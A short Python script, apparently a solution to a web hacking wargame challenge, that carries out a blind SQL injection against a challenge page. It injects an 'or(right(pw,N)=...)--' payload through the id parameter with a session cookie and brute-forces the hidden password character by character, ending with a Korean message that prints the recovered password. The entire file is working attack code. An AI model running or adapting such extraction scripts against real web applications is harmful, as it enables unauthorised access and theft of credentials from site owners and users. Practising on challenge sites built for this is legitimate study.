# -*- coding: utf-8 -*- 
import requests 
# url
url = "http://suninatas.com/challenge/web23/web23.asp"
 
cookie = {"ASPSESSIONIDCSSCCCBB" : "KPFDBEICFONODJOEKNGCGIDL"}
wordlist = "abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ<>?!@#$%^&*()_+"
result  = "i"

 
for i in range(5):
    print('#'+str(i+1))
    for k in range(0, len(wordlist)):
        query = "'or(right(pw,"+str(i+1)+")='"+wordlist[k]+result+"')--" #21+(result+1)
        print(query)
        response = requests.get(url, params={'id': query, 'pw': 'qwerty'}, cookies=cookie)
        
        if "OK" in response.text:
            result = wordlist[k]+result
            print(result)
            break
 
print("[!]" + " 최종 비밀번호는 " + result + "입니다.")